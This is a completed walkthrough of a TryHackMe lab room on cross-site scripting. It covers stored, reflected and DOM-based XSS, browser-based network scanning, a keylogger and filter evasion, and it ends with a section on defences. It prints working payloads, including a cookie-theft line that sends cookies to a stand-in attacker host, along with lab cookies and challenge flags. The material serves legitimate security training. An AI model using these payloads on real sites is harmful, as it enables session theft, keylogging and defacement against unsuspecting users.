# Cross-site Scripting

Understand how cross-site scripting occurs and how to exploit it.

[Cross-site Scripting](https://tryhackme.com/room/xss)

## Topic's

* Stored XSS
* Reflected XSS
* DOM-Based XSS
* Filter Evasion

## Task 1 Introduction

Cross-site scripting (XSS) is a security vulnerability typically found in web applications. Its a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine.

A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS.

The extent to the severity of this vulnerability depends on the type of XSS, which is normally split into two categories: persistent/stored and reflected. Depending on which, the following attacks are possible:

* Cookie Stealing - Stealing your cookie from an authenticated session, allowing an attacker to login as you without themselves having to provide authentication.
* Keylogging - An attacker can register a keyboard event listener and send all of your keystrokes to their own server.
* Webcam snapshot - Using HTML5 capabilities its possible to even take snapshots from a compromised computer webcam.
* Phishing - An attacker could either insert fake login forms into the page, or have you redirected to a clone of a site tricking you into revealing your sensitive data.
* Port Scanning - You read that correctly. You can use stored XSS to scan an internal network and identify other hosts on their network.
* Other browser based exploits - There are millions of possibilities with XSS.

Who knew this was all possible by just visiting a web-page. There are measures put in place to prevent this from happening by your browser and anti-virus.

This room will explain the different types of cross-Site scripting, attacks and require you to solve challenges along the way.

**This room is for educational purposes only, carrying out attacks explained in this room without permission from the target is illegal. I take no responsibility for your actions, you need to learn how an attacker can exploit this vulnerability in order to ensure you're patching it properly.**

1. Read the introduction.

## Task 2 Deploy your XSS Playground

Attached to this task is a machine used for all questions in this room. Every task in this room has an page on the XSS Playground site, which includes a more in-depth explanation of the vulnerability in question and supporting challenges.

Here is a sneak peak of what your playground will look like:

![](https://i.imgur.com/MTbA186.png)

You do not need to be connected to our network to deploy and access this.

1. Deploy the machine and navigate to `http://<ip>`

## Task 3 Stored XSS

Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.

**An example**

![](https://i.imgur.com/LCSFUTB.png)

A **attacker** creates a payload in a field when signing up to a website that is stored in the websites database. If the website doesn't properly sanitise that field, when the site displays that field on the page, it will execute the payload to everyone who visits it.

The payload could be as simple as `<script>alert(1)</script>`

However, this payload wont just execute in your browser but any other browsers that display the malicious data inserted into the database.

Lets experiment exploiting this type of XSS. navigate to the "Stored-XSS" page on the XSS playground.

1. The machine you deployed earlier will guide you though exploiting some cool vulnerabilities, stored XSS has to offer. There are hints for answering these questions on the machine.

`No answer needed`

2. Add a comment and see if you can insert some of your own HTML. Doing so will reveal the answer to this question.

`Successfully added a HTML comment! Answer for Q1: HTML_T4gs`

```html
<p>HEY, it's HTML!!</p>
```

`HTML_T4gs`

3. Create an alert popup box appear on the page with your document cookies.

```html
<script>alert(document.cookie)</script>
```

`connect.sid=s%3A0SQFodC6F7Ni1NqU-dU2qKJhMsyzzbA8.qPlB%2FNgyqERYyO8JmBW9v%2BXCnTTez7ODMJ0Xuq22fi8`

`W3LL_D0N3_LVL2`

4. Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.

```html
<script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>
```

`websites_can_be_easily_defaced_with_xss`

5. Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:

```html
<script>window.location='http://attacker/?cookie='+document.cookie</script>
```

This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim.

Take over Jack's account by stealing his cookie, what was his cookie value?

```html
<script>document.location='/log/'+document.cookie</script>
```

`s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE`

6. Post a comment as Jack.

`Successfully added a comment as Jack! Question answer: c00ki3_stealing_`

`c00ki3_stealing_`

## Task 4 Reflected XSS

In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.

This might seem harmless as it requires the victim to send a request containing an attackers payload, and a user wouldn't attack themselves. However, attackers could trick the user into clicking their crafted link that contains their payload via social-engineering them via email..

Reflected XSS is the most common type of XSS attack.

**An example**

![](https://i.imgur.com/yX7zRh8.png)

An attacker crafts a URL containing a malicious payload and sends it to the victim. The victim is tricked by the attacker into clicking the URL. The request could be `http://example.com/search?keyword=<script>...</script>`

The website then includes this malicious payload from the request in the response to the user. The victims browser will execute the payload inside the response. The data the script gathered is then sent back to the attacker (it might not necessarily be sent from the victim, but to another website where the attacker then gathers this data - this protects the attacker from directly receiving the victims data).

1. Craft a reflected XSS payload that will cause a popup saying "Hello"

`http://10.10.51.184/reflected?keyword=<script>alert('Hello')</script>`

`ThereIsMoreToXSSThanYouThink`

1. Craft a reflected XSS payload that will cause a popup with your machines IP address.

`10.10.51.184/reflected?keyword=<script>alert(window.location.hostname)</script>`

`ReflectiveXss4TheWin`

## Task 5 DOM-Based XSS

**What is the DOM**

DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

![](https://www.w3schools.com/js/pic_htmltree.gif)

With the object mode, Javascript gets all the power it needs to create dynamic HTML. More information can be found on w3schools website.

In a DOM-based XSS attack, a malicious payload is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed. So what does this mean?

With **reflective** xss, an attackers payload will be injected directly on the website and will not matter when other Javascript on the site gets loaded.

```html
<html>
    You searched for <em><script>...</script></em>
</html 
```

With **DOM-Based** xss, an attackers payload will only be executed when the vulnerable Javascript code is either loaded or interacted with. It goes through a Javascript function like so:

```js
var keyword = document.querySelector('#search')
keyword.innerHTML = <script>...</script>
```

1. Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.

`xxx" onmouseover="alert(document.cookie)`

`connect.sid=s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE`

`BreakingAnElementsTag`

2. Create an onhover event on an image tag, that change the background color of the website to red.

`xxx" onmouseover="document.body.style.backgroundColor='red'`

`JavascriptIsAwesome`

## Task 6 Using XSS for IP and Port Scanning

Cross-site scripting can be used for all sorts of mischief, one being the ability to scan a victims internal network and look for open ports. If an attacker is interested in what other devices are connected on the network, they can use Javascript to make requests to a range of IP addresses and determine which one responds.

On the XSS Playground, go to the IP/Port scanning tab and review a script to scan the internal network.

**IP and Port Scanning with XSS**

On the application layer your browser has no notion of internal and external IP addresses. So any website is able to tell your browser to request a resource from your internal network.

For example, a website could try to find if your router has a web interface at 192.168.0.1 by:

```html
<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">
```

Please keep in mind this is a proof of concept and there are many factors that will effect results such as response times, firewall rules, cross origin policies and more. Our browsers can conduct a basic network scan and infer about existing IP's, hostnames and services. As this is a learning exercise assume the factors do not apply here.

The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255

```html
<script>
 for (let i = 0; i < 256; i++) { // This is looping from 0 to 255
  let ip = '192.168.0.' + i // Creates variable for forming IP
  // Creating an image element, if the resource can load, it logs to the /logs page.
  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code // This is adding the image element to the webpage
 }
</script>
```

After you've found an valid IP you can then use the same method above and include a port number. However, the method described here only works with web servers (as its looking for the favicon image). A more detailed port scanner can be found here. As previously stated, this page is a proof of concept, you can create scripts which have much more capability.

1. Understand the basic proof of concept script. Then create a file on your computer with the script, modify it to suit your network and run it. See if it picks up any of your devices that has a webserver running.

`No answer needed`

## Task 7 XSS Keylogger

Javascript can be used for many things, including creating an event to listen for key-presses.

Navigate to the "Key Logger" part of the XSS playground and complete the challenge.

Key-Logger with XSS

Javascript can be used for many things, including creating an event to listen for keypresses.

```html
<script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script>
```

Now you have this script, can you adapt it and post it into the stored xss page. Then start typing on that page and see it appear on the logs page.

1. Create your own version of an XSS keylogger and see it appear in the logs part of the site.

## Task 8 Filter Evasion

There are many techniques used to filter malicious payloads that are used with cross-site scripting. It will be your job to bypass 4 commonly used filters.

Navigate to "Filter Evasion" in the XSS Playground to get started.

Cross-site scripting are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.

* XSS found in Shopify
* $7,500 for XSS found in Steam chat
* $2,500 for XSS in HackerOne
* XSS found in Instagram

1. Bypass the filter that removes any script tags.

`<img src="blah" onerror=alert("Hello") />`

`3c3cf8d90aaece81710ab9db759352c0`

2. The word alert is filtered, bypass it.

`<img src="blah" onerror=confirm("Hello") />`

`a2e5ef66f5ff584a01d734ef5edaae91`

3. The word hello is filtered, bypass it.

`<img src="blah" onerror=alert("HHelloello") />`

`decba45d0eff17c6eedf1629393bee1d`

4. Filtered in challenge 4 is as follows:

* word "Hello"
* script
* onerror
* onsubmit
* onload
* onmouseover
* onfocus
* onmouseout
* onkeypress
* onchange

`<img src="blah" ONERROR="alert('HHelloello')" />`

`2482d2e8939fc85a9363617782270555`

## Task 9 Protection Methods & Other Exploits

**Protection Methods**

There are many ways to prevent XSS, here are the 3 ways to keep cross-site scripting our of your application.

1. Escaping - Escape all user input. This means any data your application has received  is secure before rendering it for your end users. By escaping user input, key characters in the data received bu the web age will be prevented from being interpreter in any malicious way. For example, you could disallow the < and > characters from being rendered.
2. Validating Input - This is the process of ensuring your application is rendering the correct data and preventing malicious data from doing harm to your site, database and users. Input validation is disallowing certain characters from being submit in the first place.
3. Sanitising - Lastly, sanitizing data is a strong defence but should not be used to battle XSS attacks alone. Sanitizing user input is especially helpful on sites that allow HTML markup, changing the unacceptable user input into an acceptable format. For example you could sanitise the < character into the HTML entity &#60;

**Other Exploits**

XSS is often overlooked but can have just as much impact as other big impact vulnerabilities. More often than not, its about stringing several vulnerabilities together to produce a bigger/better exploit. Below are some other interesting XSS related tools and websites.

BeEF is a penetration testing tool that focuses on the web browser. The concept here is that you "hook" a browser (using XSS), then you are able to launch and control a range of different attacks.

![](https://beefproject.com/images/feature-3.jpg) ![](https://img.wonderhowto.com/img/original/26/89/63558470394098/0/635584703940982689.jpg)

BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.

1. Download and experiment with BeEF with the XSS playground.

`No answer needed`

2. Take a look at XSS-Payloads.com, download one interesting looking payload and use it on the XSS playground.

`No answer needed`
